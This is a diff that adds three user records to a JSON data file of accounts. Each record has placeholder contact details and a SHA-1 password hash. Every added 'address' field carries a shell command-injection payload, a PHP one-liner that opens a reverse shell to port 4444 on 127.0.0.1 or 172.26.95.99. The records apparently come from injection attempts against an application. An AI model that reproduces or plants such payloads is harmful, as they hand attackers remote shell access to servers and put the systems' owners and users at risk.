@@ -324,5 +324,29 @@
                 ]
             }
         ]
+    },
+    {
+        "username": "test",
+        "email": "test@test",
+        "phone": "123123123",
+        "address": "test $(php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"\/bin\/sh -i <&3 >&3 2>&3\");')",
+        "password": "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",
+        "projects": []
+    },
+    {
+        "username": "test",
+        "email": "test@test",
+        "phone": "123123123",
+        "address": "test $(php -r '$sock=fsockopen(\"172.26.95.99\",4444);exec(\"\/bin\/sh -i <&3 >&3 2>&3\");')",
+        "password": "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",
+        "projects": []
+    },
+    {
+        "username": "johndoe",
+        "email": "johndoe@example.com",
+        "phone": "1234567890",
+        "address": "es test $(php -r '$sock=fsockopen(\"172.26.95.99\",4444);exec(\"\/bin\/sh -i <&3 >&3 2>&3\");')",
+        "password": "ea0c04513c32717f3a09ff7b1fa882c4d8424b2a",
+        "projects": []
     }
 ]
